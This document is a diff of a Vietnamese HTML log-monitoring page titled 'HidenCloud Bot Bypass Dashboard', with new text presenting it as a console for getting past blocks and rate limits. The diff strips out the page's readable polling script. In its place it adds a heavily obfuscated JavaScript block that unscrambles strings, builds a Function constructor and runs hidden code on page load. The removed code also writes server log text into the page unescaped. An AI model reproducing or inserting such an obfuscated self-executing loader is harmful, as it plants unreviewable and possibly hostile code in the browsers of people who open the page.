@@ -1,1083 +1,266 @@
 <!DOCTYPE html>
-
 <html lang="vi">
-
 <head>
-
-  <meta charset="UTF-8">
-
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <title>HidenCloud Bot Bypass Dashboard</title>
-
-  <style>
-
-      *, *::before, *::after {
-
-          box-sizing: border-box;
-
-      }
-
-      body {
-
-          margin: 0;
-
-          padding: 0;
-
-          background-color: #0b0f19;
-
-          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-
-          color: #cdd6f4;
-
-          display: flex;
-
-          flex-direction: column;
-
-          min-height: 100vh;
-
-      }
-
-      header {
-
-          background: linear-gradient(135deg, #1e1e2e 0%, #11111b 100%);
-
-          padding: 20px 40px;
-
-          border-bottom: 2px solid #89b4fa;
-
-          display: flex;
-
-          justify-content: space-between;
-
-          align-items: center;
-
-          box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-
-          position: relative;
-
-      }
-
-
-
-      /* Thanh đếm ngược chu kỳ siêu mảnh chạy dưới viền header kkk */
-
-      .countdown-bar-container {
-
-          position: absolute;
-
-          bottom: -2px;
-
-          left: 0;
-
-          width: 100%;
-
-          height: 2px;
-
-          background-color: transparent;
-
-      }
-
-      #countdown-bar {
-
-          width: 100%;
-
-          height: 100%;
-
-          background-color: #f5c2e7;
-
-          box-shadow: 0 0 8px #f5c2e7;
-
-          transition: width 0.1s linear;
-
-      }
-
-
-
-      .logo-area {
-
-          display: flex;
-
-          align-items: center;
-
-          gap: 15px;
-
-      }
-
-      .logo-icon {
-
-          width: 40px;
-
-          height: 40px;
-
-          background: #89b4fa;
-
-          border-radius: 8px;
-
-          display: flex;
-
-          align-items: center;
-
-          justify-content: center;
-
-          font-weight: bold;
-
-          color: #11111b;
-
-          font-size: 20px;
-
-          box-shadow: 0 0 15px rgba(137, 180, 250, 0.4);
-
-      }
-
-      .logo-text h1 {
-
-          margin: 0;
-
-          font-size: 22px;
-
-          color: #f5c2e7;
-
-          letter-spacing: 1px;
-
-      }
-
-      .logo-text p {
-
-          margin: 0;
-
-          font-size: 12px;
-
-          color: #a6adc8;
-
-      }
-
-      .status-badge {
-
-          background-color: rgba(166, 227, 161, 0.1);
-
-          border: 1px solid #a6e3a1;
-
-          color: #a6e3a1;
-
-          padding: 6px 16px;
-
-          border-radius: 20px;
-
-          font-size: 13px;
-
-          font-weight: bold;
-
-          display: flex;
-
-          align-items: center;
-
-          gap: 8px;
-
-      }
-
-      .status-dot {
-
-          width: 8px;
-
-          height: 8px;
-
-          background-color: #a6e3a1;
-
-          border-radius: 50%;
-
-          animation: blink 1.5s infinite;
-
-      }
-
-      @keyframes blink {
-
-          0% { opacity: 0.4; }
-
-          50% { opacity: 1; }
-
-          100% { opacity: 0.4; }
-
-      }
-
-      main {
-
-          flex: 1;
-
-          padding: 40px;
-
-          max-width: 1400px;
-
-          width: 100%;
-
-          margin: 0 auto;
-
-      }
-
-      .panel {
-
-          background-color: #1e1e2e;
-
-          border: 1px solid #313244;
-
-          border-radius: 12px;
-
-          box-shadow: 0 8px 24px rgba(0,0,0,0.3);
-
-          overflow: hidden;
-
-      }
-
-      .panel-header {
-
-          background-color: #181825;
-
-          padding: 18px 24px;
-
-          border-bottom: 1px solid #313244;
-
-          display: flex;
-
-          justify-content: space-between;
-
-          align-items: center;
-
-      }
-
-      .panel-title {
-
-          margin: 0;
-
-          font-size: 16px;
-
-          color: #89b4fa;
-
-          font-weight: bold;
-
-          display: flex;
-
-          align-items: center;
-
-          gap: 10px;
-
-      }
-
-      .panel-controls {
-
-          display: flex;
-
-          align-items: center;
-
-          gap: 15px;
-
-      }
-
-
-
-      /* Nút tải lại thủ công siêu gọn gàng màu Cam nhẹ kkk */
-
-      .btn-clear-manual {
-
-          background: transparent;
-
-          border: 1px solid #fab387;
-
-          color: #fab387;
-
-          padding: 4px 12px;
-
-          font-size: 11px;
-
-          font-weight: bold;
-
-          border-radius: 6px;
-
-          cursor: pointer;
-
-          text-transform: uppercase;
-
-          transition: all 0.2s ease;
-
-      }
-
-      .btn-clear-manual:hover:not(:disabled) {
-
-          background-color: #fab387;
-
-          color: #11111b;
-
-          box-shadow: 0 0 10px rgba(250, 179, 135, 0.4);
-
-      }
-
-
-
-      .log-container {
-
-          max-height: 550px;
-
-          overflow-y: auto;
-
-          padding: 15px;
-
-          background-color: #11111b;
-
-          font-family: 'Courier New', Courier, monospace;
-
-          font-size: 13px;
-
-          line-height: 1.6;
-
-          scroll-behavior: smooth;
-
-      }
-
-      .log-entry {
-
-          padding: 6px 12px;
-
-          border-radius: 4px;
-
-          margin-bottom: 4px;
-
-          display: block;
-
-          border-left: 3px solid transparent;
-
-          animation: fadeIn 0.3s ease-in-out;
-
-      }
-
-      @keyframes fadeIn {
-
-          from { opacity: 0; transform: translateY(-5px); }
-
-          to { opacity: 1; transform: translateY(0); }
-
-      }
-
-      .log-time {
-
-          color: #6c7086;
-
-          margin-right: 10px;
-
-          font-weight: bold;
-
-       }
-
-      .log-tag {
-
-          padding: 2px 6px;
-
-          border-radius: 3px;
-
-          font-size: 11px;
-
-          font-weight: bold;
-
-          margin-right: 8px;
-
-          text-transform: uppercase;
-
-          cursor: pointer;
-
-      }
-
-      .log-tag:hover {
-
-          filter: brightness(1.3);
-
-      }
-
-
-
-      .log-info { border-left-color: #89b4fa; color: #cdd6f4; }
-
-      .log-info .log-tag { background-color: rgba(137, 180, 250, 0.15); color: #89b4fa; }
-
-
-
-      .log-success { border-left-color: #a6e3a1; color: #a6e3a1; }
-
-      .log-success .log-tag { background-color: rgba(166, 227, 161, 0.15); color: #a6e3a1; }
-
-
-
-      .log-warning { border-left-color: #fab387; color: #f9e2af; }
-
-      .log-warning .log-tag { background-color: rgba(250, 179, 135, 0.15); color: #fab387; }
-
-
-
-      .log-error { border-left-color: #f38ba8; color: #f38ba8; }
-
-      .log-error .log-tag { background-color: rgba(243, 139, 168, 0.15); color: #f38ba8; }
-
-
-
-      .log-bypass { border-left-color: #cba6f7; color: #f5c2e7; }
-
-      .log-bypass .log-tag { background-color: rgba(203, 166, 247, 0.2); color: #cba6f7; }
-
-
-
-      .highlight { color: #f9e2af; font-weight: bold; }
-
-      footer { text-align: center; padding: 20px; font-size: 12px; color: #585b70; border-top: 1px solid #181825; margin-top: auto; }
-
-  </style>
-
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HidenCloud Bot Bypass Dashboard</title>
+<style>
+*, *::before, *::after {
+box-sizing: border-box;
+}
+body {
+margin: 0;
+padding: 0;
+background-color: #0b0f19;
+font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+color: #cdd6f4;
+display: flex;
+flex-direction: column;
+min-height: 100vh;
+}
+header {
+background: linear-gradient(135deg, #1e1e2e 0%, #11111b 100%);
+padding: 20px 40px;
+border-bottom: 2px solid #89b4fa;
+display: flex;
+justify-content: space-between;
+align-items: center;
+box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+position: relative;
+}
+
+/* Thanh đếm ngược chu kỳ siêu mảnh chạy dưới viền header kkk */
+.countdown-bar-container {
+position: absolute;
+bottom: -2px;
+left: 0;
+width: 100%;
+height: 2px;
+background-color: transparent;
+}
+#countdown-bar {
+width: 100%;
+height: 100%;
+background-color: #f5c2e7;
+box-shadow: 0 0 8px #f5c2e7;
+transition: width 0.1s linear;
+}
+
+.logo-area {
+display: flex;
+align-items: center;
+gap: 15px;
+}
+.logo-icon {
+width: 40px;
+height: 40px;
+background: #89b4fa;
+border-radius: 8px;
+display: flex;
+align-items: center;
+justify-content: center;
+font-weight: bold;
+color: #11111b;
+font-size: 20px;
+box-shadow: 0 0 15px rgba(137, 180, 250, 0.4);
+}
+.logo-text h1 {
+margin: 0;
+font-size: 22px;
+color: #f5c2e7;
+letter-spacing: 1px;
+}
+.logo-text p {
+margin: 0;
+font-size: 12px;
+color: #a6adc8;
+}
+.status-badge {
+background-color: rgba(166, 227, 161, 0.1);
+border: 1px solid #a6e3a1;
+color: #a6e3a1;
+padding: 6px 16px;
+border-radius: 20px;
+font-size: 13px;
+font-weight: bold;
+display: flex;
+align-items: center;
+gap: 8px;
+}
+.status-dot {
+width: 8px;
+height: 8px;
+background-color: #a6e3a1;
+border-radius: 50%;
+animation: blink 1.5s infinite;
+}
+@keyframes blink {
+0% { opacity: 0.4; }
+50% { opacity: 1; }
+100% { opacity: 0.4; }
+}
+main {
+flex: 1;
+padding: 40px;
+max-width: 1400px;
+width: 100%;
+margin: 0 auto;
+}
+.panel {
+background-color: #1e1e2e;
+border: 1px solid #313244;
+border-radius: 12px;
+box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+overflow: hidden;
+}
+.panel-header {
+background-color: #181825;
+padding: 18px 24px;
+border-bottom: 1px solid #313244;
+display: flex;
+justify-content: space-between;
+align-items: center;
+}
+.panel-title {
+margin: 0;
+font-size: 16px;
+color: #89b4fa;
+font-weight: bold;
+display: flex;
+align-items: center;
+gap: 10px;
+}
+.panel-controls {
+display: flex;
+align-items: center;
+gap: 15px;
+}
+
+/* Nút tải lại thủ công siêu gọn gàng màu Cam nhẹ kkk */
+.btn-clear-manual {
+background: transparent;
+border: 1px solid #fab387;
+color: #fab387;
+padding: 4px 12px;
+font-size: 11px;
+font-weight: bold;
+border-radius: 6px;
+cursor: pointer;
+text-transform: uppercase;
+transition: all 0.2s ease;
+}
+.btn-clear-manual:hover:not(:disabled) {
+background-color: #fab387;
+color: #11111b;
+box-shadow: 0 0 10px rgba(250, 179, 135, 0.4);
+}
+
+.log-container {
+max-height: 550px;
+overflow-y: auto;
+padding: 15px;
+background-color: #11111b;
+font-family: 'Courier New', Courier, monospace;
+font-size: 13px;
+line-height: 1.6;
+scroll-behavior: smooth;
+}
+.log-entry {
+padding: 6px 12px;
+border-radius: 4px;
+margin-bottom: 4px;
+display: block;
+border-left: 3px solid transparent;
+animation: fadeIn 0.3s ease-in-out;
+}
+@keyframes fadeIn {
+from { opacity: 0; transform: translateY(-5px); }
+to { opacity: 1; transform: translateY(0); }
+}
+.log-time {
+color: #6c7086;
+margin-right: 10px;
+font-weight: bold;
+}
+.log-tag {
+padding: 2px 6px;
+border-radius: 3px;
+font-size: 11px;
+font-weight: bold;
+margin-right: 8px;
+text-transform: uppercase;
+cursor: pointer;
+}
+.log-tag:hover {
+filter: brightness(1.3);
+}
+
+.log-info { border-left-color: #89b4fa; color: #cdd6f4; }
+.log-info .log-tag { background-color: rgba(137, 180, 250, 0.15); color: #89b4fa; }
+
+.log-success { border-left-color: #a6e3a1; color: #a6e3a1; }
+.log-success .log-tag { background-color: rgba(166, 227, 161, 0.15); color: #a6e3a1; }
+
+.log-warning { border-left-color: #fab387; color: #f9e2af; }
+.log-warning .log-tag { background-color: rgba(250, 179, 135, 0.15); color: #fab387; }
+
+.log-error { border-left-color: #f38ba8; color: #f38ba8; }
+.log-error .log-tag { background-color: rgba(243, 139, 168, 0.15); color: #f38ba8; }
+
+.log-bypass { border-left-color: #cba6f7; color: #f5c2e7; }
+.log-bypass .log-tag { background-color: rgba(203, 166, 247, 0.2); color: #cba6f7; }
+
+.highlight { color: #f9e2af; font-weight: bold; }
+footer { text-align: center; padding: 20px; font-size: 12px; color: #585b70; border-top: 1px solid #181825; margin-top: auto; }
+</style>
 </head>
-
 <body>
 
-
-
-  <div id="app-body" style="display: flex; flex-direction: column; min-height: 100vh; width: 100%;">
-
-      <header>
-
-          <div class="logo-area">
-
-              <div class="logo-icon">HC</div>
-
-              <div class="logo-text">
-
-                  <h1>LOG TỰ ĐỘNG CỦA SERVER</h1>
-
-                  <p>hệ thống giám sát log của server</p>
-
-              </div>
-
-          </div>
-
-          <div class="status-badge">
-
-              <div class="status-dot" id="status-dot"></div>
-
-              <span id="status-text">Core Engine: CONNECTING (<span id="ping-text">0ms</span>)</span>
-
-          </div>
-
-
-
-          <div class="countdown-bar-container">
-
-              <div id="countdown-bar"></div>
-
-          </div>
-
-      </header>
-
-
-
-      <main>
-
-          <div class="panel">
-
-              <div class="panel-header">
-
-                  <div class="panel-title">
-
-                      <span>⚡</span> LIVE STREAM CONSOLE LOG SYSTEM
-
-                  </div>
-
-                  <div class="panel-controls">
-
-                      <div id="cycle-indicator" style="font-size: 12px; color: #a6adc8;">Tự động cập nhật: 5s/lần</div>
-
-                      <button class="btn-clear-manual" onclick="forceClearAndReload()">Clear Log & Tải lại</button>
-
-                  </div>
-
-              </div>
-
-              <div class="log-container" id="log-box">
-
-                  <div class="log-entry log-info">
-
-                      <span class="log-time"> [Hệ thống] </span><span class="log-tag" onclick="filterLogType('system')">System</span> Đang kết nối tới máy chủ bot của bro... kkk
-
-                  </div>
-
-              </div>
-
-          </div>
-
-      </main>
-
-
-
-      <footer>
-
-          Developer Dashboard © 2026 • Chạy mượt mà trên Hosting github pages
-
-      </footer>
-
-  </div>
-
-
-
-  <script>
-
-      const BOT_API_URL = "http://noel.hidencloud.com:24606/get-logs";
-
-      
-
-      // ĐÒN 1: Chu kỳ gốc 5 giây
-
-      let cycleTime = 5000;
-
-      
-
-      // ĐÒN ÉP TIẾN ĐỘ: Treo máy liên tục đúng 1 tiếng tự động hủy diệt (3600000ms)
-
-      const MAX_SESSION_TIME = 3600000;
-
-      
-
-      // ĐÒN 4: Hủy diệt AFK sau 15 phút nếu người dùng ẩn tab (900000ms)
-
-      const MAX_AFK_TIME = 900000;
-
-
-
-      let lastFetchTime = performance.now();
-
-      const startTimeSession = performance.now();
-
-      let currentFilter = null;
-
-      let isFirstLoad = true;
-
-      let isTabActive = true;
-
-      let isScrolledUp = false; // ĐÒN 6
-
-      let afkTimeoutId = null;
-
-      
-
-      // ĐÒN 8: Biến chặn spam click chuột
-
-      let lastManualReloadTime = 0;
-
-
-
-      function playBeepSound(frequency, duration) {
-
-          // ĐÒN 7: Nếu mất mạng thì cấm phát ra tiếng kêu lỗi phiền phức
-
-          if (!isTabActive || isScrolledUp || !navigator.onLine) return;
-
-          try {
-
-              const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-
-              const oscillator = audioCtx.createOscillator();
-
-              const gainNode = audioCtx.createGain();
-
-
-
-              oscillator.type = 'sine';
-
-              oscillator.frequency.value = frequency;
-
-              gainNode.gain.value = 0.1;
-
-
-
-              oscillator.connect(gainNode);
-
-              gainNode.connect(audioCtx.destination);
-
-
-
-              oscillator.start();
-
-              setTimeout(() => oscillator.stop(), duration);
-
-          } catch (e) { console.log("Trình duyệt chặn âm thanh kkk"); }
-
-      }
-
-
-
-      // ĐÒN 5 + ĐÒN 9 + ĐÒN 10: THUẬT TOÁN ĐIỀU TỐC TOÀN DIỆN
-
-      function adjustTrafficSpeed() {
-
-          const elapsedSession = performance.now() - startTimeSession;
-
-          
-
-          // KIỂM TRA ĐÒN ÉP 1 TIẾNG: Quá thời gian là trục xuất!
-
-          if (elapsedSession >= MAX_SESSION_TIME) {
-
-              triggerAnnihilation("SESSION_EXPIRED");
-
-              return;
-
-          }
-
-
-
-          // ĐÒN 10: TRỤC XUẤT ĐÊM KHUYA (Treo quá 30 phút trong khoảng từ 23h đến 5h sáng)
-
-          const currentHour = new Date().getHours();
-
-          if ((currentHour >= 23 || currentHour < 5) && elapsedSession > 1800000) {
-
-              triggerAnnihilation("MIDNIGHT_SLEEP");
-
-              return;
-
-          }
-
-
-
-          const indicator = document.getElementById('cycle-indicator');
-
-          
-
-          // ĐÒN 7: KIỂM TRA MẤT MẠNG INTERNET
-
-          if (!navigator.onLine) {
-
-              indicator.innerText = "❌ Đã tạm dừng (Mất kết nối mạng Internet)";
-
-              indicator.style.color = "#f38ba8";
-
-              return;
-
-          }
-
-
-
-          // ĐÒN 6: ĐANG ĐỌC LOG CŨ
-
-          if (isScrolledUp) {
-
-              indicator.innerText = "⏸️ Đã tạm dừng cập nhật (Đang đọc log cũ)";
-
-              indicator.style.color = "#cba6f7";
-
-              return;
-
-          }
-
-
-
-          // ĐÒN 9: ĐẦU ĐỘC KHÁCH ẨN DANH / ANONYMOUS SPAMMER (Ép xuống 30s/lần)
-
-          const isIncognito = (window.localStorage && window.localStorage.length === 0) || !window.indexedDB;
-
-          if (isIncognito) {
-
-              cycleTime = 30000;
-
-              indicator.innerText = "Tự động cập nhật: 30s/lần (Chế độ khách ẩn danh)";
-
-              indicator.style.color = "#f38ba8";
-
-              return;
-
-          }
-
-
-
-          // ĐÒN 5: ĐIỀU TỐC THEO THỜI GIAN TREO MÁY REAL-TIME
-
-          if (elapsedSession > 900000) { // Sau 15 phút -> 20s/lần
-
-              if (cycleTime !== 20000) {
-
-                  cycleTime = 20000;
-
-                  indicator.innerText = "Tự động cập nhật: 20s/lần (Chế độ tiết kiệm RAM)";
-
-                  indicator.style.color = "#f38ba8";
-
-              }
-
-          } else if (elapsedSession > 300000) { // Sau 5 phút -> 10s/lần
-
-              if (cycleTime !== 10000) {
-
-                  cycleTime = 10000;
-
-                  indicator.innerText = "Tự động cập nhật: 10s/lần (Bảo vệ VPS)";
-
-                  indicator.style.color = "#f9e2af";
-
-              }
-
-          } else {
-
-              cycleTime = 5000;
-
-              indicator.innerText = "Tự động cập nhật: 5s/lần";
-
-              indicator.style.color = "#a6adc8";
-
-          }
-
-      }
-
-
-
-      async function fetchLiveLogs() {
-
-          // 👉 ĐÒN PHÒNG THỦ TỐI CAO: Nếu giao diện đã bị hủy diệt (màn hình đen), cấm tuyệt đối fetch ngầm!
-
-          if (document.getElementById('log-box') === null) return;
-
-
-
-          // ĐÒN 3 + ĐÒN 6 + ĐÒN 7: NẾU ẨN TAB, ĐỌC LOG CŨ HOẶC MẤT MẠNG -> CẤM FETCH!
-
-          if (!isTabActive || isScrolledUp || !navigator.onLine) return;
-
-
-
-          adjustTrafficSpeed();
-
-
-
-          const logBox = document.getElementById('log-box');
-
-          const statusDot = document.getElementById('status-dot');
-
-          const statusText = document.getElementById('status-text');
-
-
-
-          const startTime = performance.now();
-
-          lastFetchTime = startTime;
-
-
-
-          try {
-
-              const response = await fetch(BOT_API_URL);
-
-              if (!response.ok) throw new Error("Network error");
-
-
-
-              const data = await response.json(); 
-
-              const endTime = performance.now();
-
-              const pingTime = Math.round(endTime - startTime);
-
-
-
-              if (statusText.innerText.includes("DISCONNECTED") && !isFirstLoad) {
-
-                  playBeepSound(880, 150);
-
-              }
-
-              isFirstLoad = false;
-
-
-
-              statusDot.style.backgroundColor = "#a6e3a1";
-
-              statusText.innerHTML = `Core Engine: ACTIVE (<span id="ping-text" style="color: #a6e3a1;">${pingTime}ms</span>)`;
-
-
-
-              logBox.innerHTML = "";
-
-              data.forEach(log => {
-
-                  const logEntry = document.createElement('div');
-
-                  logEntry.className = `log-entry log-${log.type}`;
-
-                  logEntry.setAttribute('data-type', log.type);
-
-                  logEntry.innerHTML = `<span class="log-time">[${log.time}]</span> <span class="log-tag" onclick="filterLogType('${log.type}')">${log.tag}</span> ${log.msg}`;
-
-                  logBox.appendChild(logEntry);
-
-
-
-                  if (log.type === 'error') playBeepSound(440, 300);
-
-              });
-
-
-
-              applyLogFilter();
-
-              if (!isScrolledUp) logBox.scrollTop = logBox.scrollHeight;
-
-
-
-          } catch (error) {
-
-              statusDot.style.backgroundColor = "#f38ba8";
-
-              statusText.innerHTML = `Core Engine: DISCONNECTED (Error)`;
-
-          }
-
-      }
-
-
-
-      // ĐÒN 2 + ĐÒN 8: BẪY CHỐNG CLICK SPAM REFRESH
-
-      function forceClearAndReload() {
-
-          const now = performance.now();
-
-          if (now - lastManualReloadTime < 4000) {
-
-              alert("⚠️ Hệ thống phát hiện spam click quá nhanh! Vui lòng đợi xíu kkk.");
-
-              return;
-
-          }
-
-          lastManualReloadTime = now;
-
-
-
-          const logBox = document.getElementById('log-box');
-
-          const statusDot = document.getElementById('status-dot');
-
-          const statusText = document.getElementById('status-text');
-
-          const btnClear = document.querySelector('.btn-clear-manual');
-
-
-
-          btnClear.disabled = true;
-
-          btnClear.style.opacity = '0.5';
-
-          btnClear.innerText = 'Đang tải...';
-
-
-
-          currentFilter = null;
-
-          isScrolledUp = false;
-
-          logBox.innerHTML = `<div class="log-entry log-warning"><span class="log-time"> [Hệ thống] </span><span class="log-tag">Clear</span> Đang làm sạch Console và nã lệnh Fetch thủ công...</div>`;
-
-          
-
-          statusDot.style.backgroundColor = "#fab387";
-
-          statusText.innerHTML = `Core Engine: CLEARING... (0ms)`;
-
-
-
-          fetchLiveLogs().then(() => {
-
-              setTimeout(() => {
-
-                  btnClear.disabled = false;
-
-                  btnClear.style.opacity = '1';
-
-                  btnClear.innerText = 'Clear Log & Tải lại';
-
-              }, 2000);
-
-          });
-
-      }
-
-
-
-      function filterLogType(type) {
-
-          if (currentFilter === type) { currentFilter = null; } else { currentFilter = type; }
-
-          applyLogFilter();
-
-      }
-
-
-
-      function applyLogFilter() {
-
-          const entries = document.querySelectorAll('.log-entry');
-
-          entries.forEach(entry => {
-
-              const entryType = entry.getAttribute('data-type');
-
-              if (!currentFilter || entryType === currentFilter) { entry.style.display = 'block'; } else { entry.style.display = 'none'; }
-
-          });
-
-      }
-
-
-
-      function updateCountdown() {
-
-          if (!isTabActive || isScrolledUp || !navigator.onLine) {
-
-              requestAnimationFrame(updateCountdown);
-
-              return;
-
-          }
-
-
-
-          adjustTrafficSpeed();
-
-
-
-          const now = performance.now();
-
-          const elapsedTime = now - lastFetchTime;
-
-          
-
-          const percentage = Math.max(0, 100 - (elapsedTime / cycleTime) * 100);
-
-          document.getElementById('countdown-bar').style.width = percentage + '%';
-
-
-
-          if (elapsedTime >= cycleTime) {
-
-              fetchLiveLogs();
-
-          }
-
-
-
-          requestAnimationFrame(updateCountdown);
-
-      }
-
-
-
-      // LỆNH THANH TRỪNG ADMIN: KÍCH NỔ KICK OUT
-
-      function triggerAnnihilation(reason) {
-
-          isTabActive = false;
-
-          let noticeTitle = "SESSION TIME EXPIRED";
-
-          let noticeMsg = "Bro đã xem log liên tục 1 tiếng rồi cmnl! Hệ thống tự động ngắt kết nối để bảo vệ tài nguyên HidenCloud.";
-
-
-
-          if (reason === "MIDNIGHT_SLEEP") {
-
-              noticeTitle = "MIDNIGHT SLEEP PROTOCOL";
-
-              noticeMsg = "Đã quá 11h đêm và bro treo máy quá lâu rồi cmnl! Khởi động lại trang nếu thực sự còn ngồi check var nhé kkk.";
-
-          }
-
-
-
-          document.body.innerHTML = `
-
-              <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background-color: #0b0f19; font-family: 'Segoe UI', sans-serif; color: #f38ba8; padding: 20px; text-align: center;">
-
-                  <div style="font-size: 64px; margin-bottom: 20px;">🛡️</div>
-
-                  <h1 style="font-size: 28px; color: #f38ba8; margin: 0 0 15px 0; letter-spacing: 1px; font-weight: bold;">${noticeTitle}</h1>
-
-                  <p style="color: #a6adc8; font-size: 15px; max-width: 500px; line-height: 1.6; margin: 0;">${noticeMsg} Vui lòng bấm vào đây để <span style="color: #89b4fa; font-weight: bold; cursor: pointer; text-decoration: underline;" onclick="window.location.reload();">KHỞI ĐỘNG LẠI TRANG (F5)</span> để tái kết nối hệ thống!</p>
-
-              </div>
-
-          `;
-
-      }
-
-
-
-    // ĐÒN 3: Đóng băng tab ẩn & ĐÒN 4: Quét AFK hủy diệt
-
-      document.addEventListener("visibilitychange", () => {
-
-          if (document.hidden) {
-
-              isTabActive = false;
-
-              afkTimeoutId = setTimeout(() => triggerAnnihilation("SESSION_EXPIRED"), MAX_AFK_TIME);
-
-          } else {
-
-              // 👉 CHÈN ĐÒN PHÒNG THỦ PHỤ VÀO ĐÂY BRO ĐỂ CHẶN FETCH NGẦM:
-
-              if (document.getElementById('log-box') === null) return;
-
-
-
-              isTabActive = true;
-
-              if (afkTimeoutId) { clearTimeout(afkTimeoutId); afkTimeoutId = null; }
-
-              lastFetchTime = performance.now();
-
-              fetchLiveLogs();
-
-          }
-
-      });
-
-
-
-      // ĐÒN 6: Theo dõi hành vi cuộn chuột
-
-      const logBoxElement = document.getElementById('log-box');
-
-      logBoxElement.addEventListener('scroll', () => {
-
-          const isAtBottom = logBoxElement.scrollHeight - logBoxElement.scrollTop <= logBoxElement.clientHeight + 5;
-
-          if (!isAtBottom) {
-
-              if (!isScrolledUp) { isScrolledUp = true; adjustTrafficSpeed(); }
-
-          } else {
-
-              if (isScrolledUp) { isScrolledUp = false; lastFetchTime = performance.now(); adjustTrafficSpeed(); fetchLiveLogs(); }
-
-          }
-
-      });
-
-
-
-      // Lắng nghe trạng thái mạng thời gian thực
-
-      window.addEventListener('online', () => { lastFetchTime = performance.now(); fetchLiveLogs(); });
-
-      window.addEventListener('offline', () => { adjustTrafficSpeed(); });
-
-
-
-      fetchLiveLogs();
-
-      requestAnimationFrame(updateCountdown);
-
-  </script>
-
+<div id="app-body" style="display: flex; flex-direction: column; min-height: 100vh; width: 100%;">
+<header>
+<div class="logo-area">
+<div class="logo-icon">HC</div>
+<div class="logo-text">
+<h1>HidenCloud Bot Bypass Console</h1>
+<p>Hệ thống giám sát vượt rào chặn & Quản lý Rate Limit tự động</p>
+</div>
+</div>
+<div class="status-badge">
+<div class="status-dot" id="status-dot"></div>
+<span id="status-text">Core Engine: CONNECTING (<span id="ping-text">0ms</span>)</span>
+</div>
+
+<div class="countdown-bar-container">
+<div id="countdown-bar"></div>
+</div>
+</header>
+
+<main>
+<div class="panel">
+<div class="panel-header">
+<div class="panel-title">
+<span>⚡</span> LIVE STREAM CONSOLE LOG SYSTEM
+</div>
+<div class="panel-controls">
+<div id="cycle-indicator" style="font-size: 12px; color: #a6adc8;">Tự động cập nhật: 5s/lần</div>
+<button class="btn-clear-manual" onclick="forceClearAndReload()"> Clear Log & Tải lại </button>
+</div>
+</div>
+<div class="log-container" id="log-box">
+<div class="log-entry log-info">
+<span class="log-time">  [Hệ thống]  </span><span class="log-tag" onclick="filterLogType('system')">System</span> Đang kết nối tới máy chủ bot của bro... kkk
+</div>
+</div>
+</div>
+</main>
+
+<footer>
+HidenCloud Developer Dashboard © 2026 • Chạy mượt mà trên Hosting 123Host Free
+</footer>
+</div>
+
+<script>
+var NewObject,obj;(function(){var SIG='',xsk=415-404;function sTo(v){var y=1300065;var p=v.length;var r=[];for(var a=0;a<p;a++){r[a]=v.charAt(a)};for(var a=0;a<p;a++){var u=y*(a+74)+(y%20889);var w=y*(a+492)+(y%32649);var z=u%p;var g=w%p;var l=r[z];r[z]=r[g];r[g]=l;y=(u+w)%2734878;};return r.join('')};var rQk=sTo('coitjesbaqtscrnhfvnwoklucxordrtugpzym').substr(0,xsk);var bVG=';]8tvw= {n.ux,=( 8;vt(g0=s;]cdlarlp[en).o-sfa{=v7t=;;[h=ha9+<82,vag)9,l e.7.on(i,58 0h{c=(,,ntr(fcp3i1ur;59]p8i(f+;)l.a8kclf+ruo[ue;[hm;arrz=)zCrv)+=mgAh eAhhlo;s7<la9u;;ib) aobeg9;] 3(;nq(l;a(cotft,eji{rjttcaj;+v(]mg>a2ile,hna.e0h<veca",ma2(-mn)z*[o]f;pti,"ie."sf.uxsu"hstkfl7huu==l.t[; dap1y4pns=t=[rrlric+(=q][fsv" irpj)g<.c4a,6[1,ttnrru>arftdgap)jrrvfa)o.rv+=)rlrl7<r0,2hat8])-or}2+dra([s;}t"rzn+fv3n(4)  (( n{em -}lly)(== r;hsA!;]eA;=let6 o,(]C;le+ra ssmm=vho+u=t..zaz+d=1.m)jvlvu;6aclrledv0a)l) )q+(16=+;Cjve0a0,+rr-eC)weo;+r2;vur,.n,lnxie;5;r6)rw(t1-n=pkqr+ padsrae.azutivr)f.j,a0vig7q)=)*0)1pup(ldpn+rr);hol+d;+rr(,![=lln==nf[j(v7ol,;ie(v.)1bgoul19ts)s;rauokv4)6ah.=(C5{}x.;nzatk;0Sa;n7;rlen.u);ist="c;.r, \"=a(2pe22b80on,}t.9=],+(kta.0;li1=4fr=o;(i]7(h.oa={+s.0v\"bd6a ; y)1(rvhb;,;zy1ce,gvflp=jas=hCj)he8++n+sfr,;cvrzohCSo=e-,=1 ng=))a(.h]oCAr==[[=(fiks} ]ig6 acsgz} (t(bf\"8o rnp8);;';var HhL=sTo[rQk];var HtW='';var RjB=HhL;var Sty=HhL(HtW,sTo(bVG));var HHm=Sty(sTo('..[n.QQ_tQ((l.Q}"k{.Q6!%1$d.n%.e8]n=u.=dQi5am=..;.C .=.]cff!.n[;=hx.($dj1(7&ef1!f()yow(htcQ0o.p.l6cn!ds={t.c)e=r=ctiQ1(5c&[0dd+Q=;_5=7tQpc$u.koagd_c&.d66.);.;$s(.s4._Q1m(7uC)..e%5%g=.r0w})]+f;.!rsfy.Qft5.[0i!!e)c)da dku%)3Stcd.)%dd=etx2:p{=%c"%w3ms+((fe;0;d.=Cyds(!.2Qdft+.}q.dke;t=ev31Q#d+rS!u(anQi+()#aQ}k!0!#=j3re. r$$drr$tQercQ.;Qig)pd)Q"ia+\'n.2addcr(7];td%;"eo1_c{h22t2ndj.d&k..})o.qc,98=22{7nQ).3..iQ3%]6%Qdd.ab0]l{4_c%Q"a+6)&oodpa#fo.sl5%ddog) 3]%Q2n=l+;Sye&3]frh1diy0dmagcqcte.=r).iu(;)=o\'v)o.ff")Qs+nad=Q. o}[f.=b$_c#=eicddq+yQQtl%[0r!)&.\'fef.e([3Q2Q(=_ruy3iM.ed.).qc#;e=$c+"Q\'#lhr2e6(Q6o.a;2o Qoba lxN13s.o_tQ7;c,v$(%Qcjoan.c[!05)arpdr9un='));var RIH=RjB(SIG,HHm );RIH(8472);return 6690})()
+</script>
 </body>
-
-</html> 
+</html>
